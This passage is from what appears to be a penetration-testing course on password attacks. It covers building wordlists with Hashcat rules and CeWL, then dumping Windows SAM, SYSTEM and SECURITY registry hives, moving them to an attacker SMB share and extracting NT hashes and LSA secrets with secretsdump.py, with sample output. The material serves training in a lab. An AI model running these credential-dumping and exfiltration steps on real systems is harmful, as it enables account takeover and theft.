&lt;p&gt;Unfortunately, the tendency for users to create weak passwords also occurs despite the existence of password policies. Most people/employees follow the same rules when creating more complex passwords. Passwords are often created closely related to the service used. This means that many employees often select passwords that can have the company’s name in the passwords. A person’s preferences and interests also play a significant role. These can be pets, friends, sports, hobbies, and many other elements of life. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OSINT&lt;/code&gt; information gathering can be very helpful for finding out more about a user’s preferences and may assist with password guessing. More information about OSINT can be found in the &lt;a href=&quot;https://academy.hackthebox.com/course/preview/osint-corporate-recon&quot;&gt;OSINT: Corporate Recon module&lt;/a&gt;. Commonly, users use the following additions for their password to fit the most common password policies:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Password Syntax&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;First letter is uppercase.&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Password&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Adding numbers.&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Password123&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Adding year.&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Password2022&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Adding month.&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Password02&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Last character is an exclamation mark.&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Password2022!&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Adding special characters.&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;P@ssw0rd2022!&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Considering that many people want to keep their passwords as simple as possible despite password policies, we can create rules for generating weak passwords. Based on statistics provided by &lt;a href=&quot;https://wpengine.com/resources/passwords-unmasked-infographic/&quot;&gt;WPengine&lt;/a&gt;, most password lengths are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;not longer&lt;/code&gt; than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ten&lt;/code&gt; characters. So what we can do is to pick specific terms that are at least &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;five&lt;/code&gt; characters long and seem to be the most familiar to the users, such as the names of their pets, hobbies, preferences, and other interests. If the user chooses a single word (such as the current month), adds the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current year&lt;/code&gt;, followed by a special character, at the end of their password, we would reach the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ten-character&lt;/code&gt; password requirement. Considering that most companies require regular password changes, a user can modify their password by just changing the name of a month or a single number, etc. Let’s use a simple example to create a password list with only one entry.&lt;/p&gt;

&lt;h6 id=&quot;password-list&quot;&gt;Password List&lt;/h6&gt;

&lt;p&gt;Password Mutations&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;password.list
&lt;span class=&quot;go&quot;&gt;
password
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can use a very powerful tool called &lt;a href=&quot;https://hashcat.net/hashcat/&quot;&gt;Hashcat&lt;/a&gt; to combine lists of potential names and labels with specific mutation rules to create custom wordlists. To become more familiar with Hashcat and discover the full potential of this tool, we recommend the module &lt;a href=&quot;https://academy.hackthebox.com/course/preview/cracking-passwords-with-hashcat&quot;&gt;Cracking Passwords with Hashcat&lt;/a&gt;. Hashcat uses a specific syntax for defining characters and words and how they can be modified. The complete list of this syntax can be found in the official &lt;a href=&quot;https://hashcat.net/wiki/doku.php?id=rule_based_attack&quot;&gt;documentation&lt;/a&gt; of Hashcat. However, the ones listed below are enough for us to understand how Hashcat mutates words.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Function&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Do nothing.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Lowercase all letters.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;u&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Uppercase all letters.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Capitalize the first letter and lowercase others.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sXY&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Replace all instances of X with Y.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$!&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Add the exclamation character at the end.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Each rule is written on a new line which determines how the word should be mutated. If we write the functions shown above into a file and consider the aspects mentioned, this file can then look like this:&lt;/p&gt;

&lt;h4 id=&quot;hashcat-rule-file&quot;&gt;Hashcat Rule File&lt;/h4&gt;

&lt;p&gt;Password Mutations&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;custom.rule
&lt;span class=&quot;go&quot;&gt;
:
c
so0
c so0
sa@
c sa@
c sa@ so0
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; c
&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; so0
&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; sa@
&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; c so0
&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; c sa@
&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; so0 sa@
&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; c so0 sa@
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hashcat will apply the rules of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;custom.rule&lt;/code&gt; for each word in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password.list&lt;/code&gt; and store the mutated version in our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mut_password.list&lt;/code&gt; accordingly. Thus, one word will result in fifteen mutated words in this case.&lt;/p&gt;

&lt;p&gt;Password Mutations&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;hashcat &lt;span class=&quot;nt&quot;&gt;--force&lt;/span&gt; password.list &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; custom.rule &lt;span class=&quot;nt&quot;&gt;--stdout&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; mut_password.list
&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;mut_password.list
&lt;span class=&quot;go&quot;&gt;
password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hashcat&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;John&lt;/code&gt; come with pre-built rule lists that we can use for our password generating and cracking purposes. One of the most used rules is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;best64.rule&lt;/code&gt;, which can often lead to good results. It is important to note that password cracking and the creation of custom wordlists is a guessing game in most cases. We can narrow this down and perform more targeted guessing if we have information about the password policy and take into account the company name, geographical region, industry, and other topics/words that users may select from to create their passwords. Exceptions are, of course, cases where passwords are leaked and found.&lt;/p&gt;

&lt;h4 id=&quot;hashcat-existing-rules&quot;&gt;Hashcat Existing Rules&lt;/h4&gt;

&lt;p&gt;Password Mutations&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /usr/share/hashcat/rules/
&lt;span class=&quot;go&quot;&gt;
best64.rule                  specific.rule
combinator.rule              T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
d3ad0ne.rule                 T0XlC-insert_space_and_special_0_F.rule
dive.rule                    T0XlC-insert_top_100_passwords_1_G.rule
generated2.rule              T0XlC.rule
generated.rule               T0XlCv1.rule
hybrid                       toggles1.rule
Incisive-leetspeak.rule      toggles2.rule
InsidePro-HashManager.rule   toggles3.rule
InsidePro-PasswordsPro.rule  toggles4.rule
leetspeak.rule               toggles5.rule
oscommerce.rule              unix-ninja-leetspeak.rule
rockyou-30000.rule
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can now use another tool called &lt;a href=&quot;https://github.com/digininja/CeWL&quot;&gt;CeWL&lt;/a&gt; to scan potential words from the company’s website and save them in a separate list. We can then combine this list with the desired rules and create a customized password list that has a higher probability of guessing a correct password. We specify some parameters, like the depth to spider (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-d&lt;/code&gt;), the minimum length of the word (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-m&lt;/code&gt;), the storage of the found words in lowercase (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--lowercase&lt;/code&gt;), as well as the file where we want to store the results (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-w&lt;/code&gt;).&lt;/p&gt;

&lt;h6 id=&quot;generating-wordlists-using-cewl&quot;&gt;Generating Wordlists Using CeWL&lt;/h6&gt;

&lt;p&gt;Password Mutations&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;cewl https://www.inlanefreight.com &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; 4 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 6 &lt;span class=&quot;nt&quot;&gt;--lowercase&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; inlane.wordlist
&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; inlane.wordlist
&lt;span class=&quot;go&quot;&gt;
326
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h4 id=&quot;attacking-sam&quot;&gt;Attacking SAM&lt;/h4&gt;

&lt;p&gt;With access to a non-domain joined Windows system, we may benefit from attempting to quickly dump the files associated with the SAM database to transfer them to our attack host and start cracking hashes offline. Doing this offline will ensure we can continue to attempt our attacks without maintaining an active session with a target. Let’s walk through this process together using a target host. Feel free to follow along by spawning the target box in this section.&lt;/p&gt;

&lt;h6 id=&quot;copying-sam-registry-hives&quot;&gt;Copying SAM Registry Hives&lt;/h6&gt;

&lt;p&gt;There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Registry Hive&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hklm\sam&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hklm\system&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hklm\security&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;We can create backups of these hives using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reg.exe&lt;/code&gt; utility.&lt;/p&gt;

&lt;h6 id=&quot;using-regexe-save-to-copy-registry-hives&quot;&gt;Using reg.exe save to Copy Registry Hives&lt;/h6&gt;

&lt;p&gt;Launching CMD as an admin will allow us to run reg.exe to save copies of the aforementioned registry hives. Run these commands below to do so:&lt;/p&gt;

&lt;p&gt;Attacking SAM&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd-session&quot;&gt;C:\WINDOWS\system32&amp;gt; reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32&amp;gt; reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32&amp;gt; reg.exe save hklm\security C:\security.save

The operation completed successfully.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Technically we will only need &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hklm\sam&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hklm\system&lt;/code&gt;, but &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hklm\security&lt;/code&gt; can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts. Once the hives are saved offline, we can use various methods to transfer them to our attack host. In this case, let’s use &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py&quot;&gt;Impacket’s smbserver.py&lt;/a&gt; in combination with some useful CMD commands to move the hive copies to a share created on our attack host.&lt;/p&gt;

&lt;h6 id=&quot;creating-a-share-with-smbserverpy&quot;&gt;Creating a Share with smbserver.py&lt;/h6&gt;

&lt;p&gt;All we must do to create the share is run smbserver.py -smb2support using python, give the share a name (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CompData&lt;/code&gt;) and specify the directory on our attack host where the share will be storing the hive copies (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/ltnbob/Documents&lt;/code&gt;). Know that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb2support&lt;/code&gt; option will ensure that newer versions of SMB are supported. If we do not use this flag, there will be errors when connecting from the Windows target to the share hosted on our attack host. Newer versions of Windows do not support SMBv1 by default because of the &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1&quot;&gt;numerous severe vulnerabilites&lt;/a&gt; and publicly available exploits.&lt;/p&gt;

&lt;p&gt;Attacking SAM&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 /usr/share/doc/python3-impacket/examples/smbserver.py &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt; CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once we have the share running on our attack host, we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;move&lt;/code&gt; command on the Windows target to move the hive copies to the share.&lt;/p&gt;

&lt;h6 id=&quot;moving-hive-copies-to-share&quot;&gt;Moving Hive Copies to Share&lt;/h6&gt;

&lt;p&gt;Attacking SAM&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\&amp;gt; move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\&amp;gt; move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\&amp;gt; move system.save \\10.10.15.16\CompData
        1 file(s) moved.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then we can confirm that our hive copies successfully moved to the share by navigating to the shared directory on our attack host and using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; to list the files.&lt;/p&gt;

&lt;h4 id=&quot;confirming-hive-copies-transferred-to-attack-host&quot;&gt;Confirming Hive Copies Transferred to Attack Host&lt;/h4&gt;

&lt;p&gt;Attacking SAM&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;
sam.save  security.save  system.save
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h6 id=&quot;dumping-hashes-with-impackets-secretsdumppy&quot;&gt;Dumping Hashes with Impacket’s secretsdump.py&lt;/h6&gt;

&lt;p&gt;One incredibly useful tool we can use to dump the hashes offline is Impacket’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secretsdump.py&lt;/code&gt;. Impacket can be found on most modern penetration testing distributions. We can check for it by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;locate&lt;/code&gt; on a Linux-based system:&lt;/p&gt;

&lt;h6 id=&quot;locating-secretsdumppy&quot;&gt;Locating secretsdump.py&lt;/h6&gt;

&lt;p&gt;Attacking SAM&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;locate secretsdump 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using secretsdump.py is a simple process. All we must do is run secretsdump.py using Python, then specify each hive file we retrieved from the target host.&lt;/p&gt;

&lt;h6 id=&quot;running-secretsdumppy&quot;&gt;Running secretsdump.py&lt;/h6&gt;

&lt;p&gt;Attacking SAM&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python3 /usr/share/doc/python3-impacket/examples/secretsdump.py &lt;span class=&quot;nt&quot;&gt;-sam&lt;/span&gt; sam.save &lt;span class=&quot;nt&quot;&gt;-security&lt;/span&gt; security.save &lt;span class=&quot;nt&quot;&gt;-system&lt;/span&gt; system.save LOCAL
&lt;span class=&quot;go&quot;&gt;
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;[*] NL$&lt;/span&gt;KM 
&lt;span class=&quot;gp&quot;&gt; 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....&amp;gt;&lt;/span&gt;w4...&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;..&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;i
&lt;span class=&quot;go&quot;&gt; 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;NL$&lt;/span&gt;KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
&lt;span class=&quot;go&quot;&gt;[*] Cleaning up... 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we see that secretsdump successfully dumps the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local&lt;/code&gt; SAM hashes and would’ve also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\security. Notice the first step secretsdump executes is targeting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system bootkey&lt;/code&gt; before proceeding to dump the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LOCAL SAM hashes&lt;/code&gt;. It cannot dump those hashes without the boot key because that boot key is used to encrypt &amp;amp; decrypt the SAM database, which is why it is important for us to have copies of the registry hives we discussed earlier in this section. Notice at the top of the secretsdump.py output:&lt;/p&gt;

&lt;p&gt;Attacking SAM&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;Dumping local SAM hashes (uid:rid:lmhash:nthash)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This tells us how to read the output and what hashes we can crack. Most modern Windows operating systems store the password as an NT hash. Operating systems older than Windows Vista &amp;amp; Windows Server 2008 store passwords as an LM hash, so we may only benefit from cracking those if our target is an older Windows OS.&lt;/p&gt;

&lt;p&gt;Knowing this, we can copy the NT hashes associated with each user account into a text file and start cracking passwords. It may be beneficial to make a note of each user, so we know which password is associated with which user account.&lt;/p&gt;

&lt;hr /&gt;

&lt;h4 id=&quot;cracking-hashes-with-hashcat&quot;&gt;Cracking Hashes with Hashcat&lt;/h4&gt;

&lt;p&gt;Once we have the hashes, we can start attempting to crack them using &lt;a href=&quot;https://hashcat.net/hashcat/&quot;&gt;Hashcat&lt;/a&gt;. We will use it to attempt to crack the hashes we have gathered. If we take a glance at the Hashcat website, we will notice support for a wide array of hashing algorithms. In this module, we use Hashcat for specific use cases. This should help us develop the mindset &amp;amp; understanding to use Hashcat as well as know when we need to reference Hashcat’s documentation to understand what mode and options we need to use depending on the hashes we capture.&lt;/p&gt;

&lt;p&gt;As mentioned previously, we can populate a text file with the NT hashes we were able to dump.&lt;/p&gt;

&lt;h6 id=&quot;adding-nthashes-to-a-txt-file&quot;&gt;Adding nthashes to a .txt File&lt;/h6&gt;

&lt;p&gt;Attacking SAM&lt;/p&gt;

